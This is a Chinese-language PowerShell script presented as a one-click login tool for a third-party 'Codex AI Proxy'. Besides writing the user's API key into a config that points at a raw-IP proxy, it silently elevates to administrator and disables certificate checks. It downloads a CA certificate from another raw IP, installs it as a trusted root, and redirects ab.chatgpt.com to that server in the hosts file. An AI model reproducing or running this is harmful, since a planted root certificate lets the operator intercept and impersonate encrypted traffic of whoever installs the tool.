<#
    元数智慧科技 · Codex AI Proxy — 一键登录工具 (Windows)
    版本 1.0 | 专有资产 · 未经授权不得传播
#>

$PROXY_URL = "http://113.90.157.107:8317/v1"
$STATSIG_SERVER = "94.191.115.90"
$CODEX_HOME = "$env:USERPROFILE\.codex"
$YUANSHU_DIR = "$CODEX_HOME\yuanshu"

# 请求管理员权限（弹窗一次，后续不再需要）
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit 0
}

Write-Host "`n  ╔═══════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║       欢迎使用元数智慧 AI Proxy           ║" -ForegroundColor Cyan
Write-Host "  ╚═══════════════════════════════════════════╝" -ForegroundColor Cyan

# 检测是否已登录
$configPath = "$CODEX_HOME\config.toml"
if (Test-Path $configPath) {
    $content = Get-Content $configPath -Raw
    if ($content -match 'model_provider\s*=\s*"custom-proxy"') {
        Write-Host "`n  ✅ 你已经登录过了，不用重复操作" -ForegroundColor Yellow
        Read-Host "`n  (按 Enter 键关闭)"
        exit 0
    }
}

# 输入 API Key
if (-not $env:CODEX_API_KEY) {
    $securekey = Read-Host -AsSecureString "  请输入你的 API Key"
    $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securekey)
    $CODEX_API_KEY = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
} else { $CODEX_API_KEY = $env:CODEX_API_KEY }
if ([string]::IsNullOrWhiteSpace($CODEX_API_KEY)) {
    Write-Host "  ❌ 没有 API Key 无法使用" -ForegroundColor Red; Read-Host; exit 1
}

# 连接服务器
Write-Host "`n  → 正在连接服务器..."
try {
    $headers = @{ Authorization = "Bearer $CODEX_API_KEY" }
    $response = Invoke-RestMethod -Uri "${PROXY_URL}/models" -Headers $headers -TimeoutSec 10 -ErrorAction Stop
    $MODELS = $response.data | Where-Object { $_.id -ne 'wan2.7-image' } | Select-Object -ExpandProperty id
    Write-Host "  ✅ 连接成功！共 $($MODELS.Count) 个模型可用" -ForegroundColor Green
} catch {
    Write-Host "  ⚠️  连接失败，请检查 API Key" -ForegroundColor Yellow
    $MODELS = @("deepseek-v4-flash", "deepseek-v4-pro")
}

# 保存原始设置
New-Item -ItemType Directory -Force -Path "$YUANSHU_DIR" | Out-Null
if ((Test-Path "$CODEX_HOME\config.toml") -and -not (Select-String -Path "$CODEX_HOME\config.toml" -Pattern 'model_provider.*custom-proxy' -Quiet -ErrorAction Ignore)) {
    Copy-Item "$CODEX_HOME\config.toml" "$YUANSHU_DIR\backup.config.toml" -Force
} elseif (-not (Test-Path "$YUANSHU_DIR\backup.config.toml")) {
    @"
model = "gpt-5.5"
model_reasoning_effort = "medium"
"@ | Set-Content "$YUANSHU_DIR\backup.config.toml" -Encoding UTF8
}

# 写入配置
function ConvertTo-DisplayName { param([string]$slug)
    $known = @{ deepseek="DeepSeek"; gpt="GPT"; qwen="Qwen"; codex="Codex"; glm="GLM"; kimi="Kimi"; claude="Claude"; gemini="Gemini"; mistral="Mistral"; llama="Llama"; yi="Yi"; moonshot="Moonshot" }
    $parts = $slug.Replace("-"," ").Split(" ", [StringSplitOptions]::RemoveEmptyEntries)
    $result = @()
    foreach ($p in $parts) { $lower = $p.ToLower()
        if ($known.ContainsKey($lower)) { $result += $known[$lower] }
        elseif ($lower -match '^[\d.]+[a-z]?$') { $result += $p.ToUpper() }
        else { $result += (Get-Culture).TextInfo.ToTitleCase($p) } }
    return $result -join " "
}
function Get-ReasoningLevels { param([string]$slug)
    $s = $slug.ToLower()
    if ($s.StartsWith("gpt")) { return @(@{effort="low";description="Fast"};@{effort="medium";description="Balanced"};@{effort="high";description="Deep"};@{effort="xhigh";description="Extra deep"};@{effort="max";description="Max"};@{effort="ultra";description="Ultra"}) }
    if ($s.StartsWith("deepseek")) { return @(@{effort="low";description="Fast"};@{effort="medium";description="Balanced"};@{effort="high";description="Default"};@{effort="xhigh";description="Extra deep"};@{effort="max";description="Max"}) }
    return @(@{effort="low";description="Fast"};@{effort="medium";description="Balanced"};@{effort="high";description="Deep"})
}

$TEMPLATE = @{ default_reasoning_level="medium"; shell_type="shell_command"; visibility="list"; supported_in_api=$true; base_instructions="You are Codex, a coding agent."; model_messages=@{}; include_skills_usage_instructions=$true; supports_reasoning_summaries=$true; default_reasoning_summary="none"; support_verbosity=$true; default_verbosity="low"; apply_patch_tool_type="freeform"; web_search_tool_type="text_and_image"; truncation_policy=@{mode="tokens";limit=10000}; supports_parallel_tool_calls=$true; supports_image_detail_original=$true; context_window=1000000; max_context_window=1000000; effective_context_window_percent=95; experimental_supported_tools=@(); input_modalities=@("text","image"); supports_search_tool=$true; use_responses_lite=$false; additional_speed_tiers=@(); service_tiers=@(); availability_nux=$null; upgrade=$null }
$entries = @(); $i = 1
foreach ($slug in $MODELS) {
    if ([string]::IsNullOrWhiteSpace($slug)) { continue }
    $entry = $TEMPLATE.PSObject.Copy()
    $entry.slug = $slug; $entry.display_name = ConvertTo-DisplayName $slug; $entry.description = "$(ConvertTo-DisplayName $slug) via proxy"
    $entry.supported_reasoning_levels = Get-ReasoningLevels $slug; $entry.priority = $i
    if ($slug.ToLower().Contains("qwen")) { $entry.context_window = 131072; $entry.max_context_window = 131072 }
    $entries += $entry; $i++
}
Set-Content -Path "$YUANSHU_DIR\metaproxy-models.json" -Value (@{ models=$entries } | ConvertTo-Json -Depth 10) -Encoding UTF8

$FIRST_MODEL = $MODELS[0]
@"
model = "$FIRST_MODEL"
model_provider = "custom-proxy"
model_reasoning_effort = "medium"
model_catalog_json = "$YUANSHU_DIR\metaproxy-models.json"

[model_providers.custom-proxy]
name = "元数智慧 · Codex AI Proxy"
base_url = "$PROXY_URL"
experimental_bearer_token = "$CODEX_API_KEY"
requires_openai_auth = false
"@ | Set-Content "$CODEX_HOME\config.toml" -Encoding UTF8

# 配置系统（证书 + hosts，已提权无需再确认）
$CA_PATH = "$YUANSHU_DIR\ca.crt"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
try { Invoke-WebRequest -Uri "https://${STATSIG_SERVER}:8318/ca.crt" -OutFile $CA_PATH -TimeoutSec 5 -ErrorAction Stop | Out-Null } catch {}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null

$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
$hostsLine = "${STATSIG_SERVER} ab.chatgpt.com"

Write-Host "  → 需要输入电脑密码..."
if ((Test-Path $CA_PATH) -and (Get-Item $CA_PATH).length -gt 0) {
    certutil -addstore Root $CA_PATH | Out-Null
}
if (-not (Select-String -Path $hostsPath -Pattern "ab.chatgpt.com" -Quiet -ErrorAction Ignore)) {
    Add-Content -Path $hostsPath -Value "`r`n$hostsLine" -Force
}

# 完成
Write-Host "`n  ╔═══════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║           🎉 登录成功                     ║" -ForegroundColor Cyan
Write-Host "  ╚═══════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host "`n  可用模型:" -ForegroundColor White
foreach ($m in $MODELS) { Write-Host "    • $m" -ForegroundColor Gray }
Read-Host "`n  (按 Enter 键关闭)"
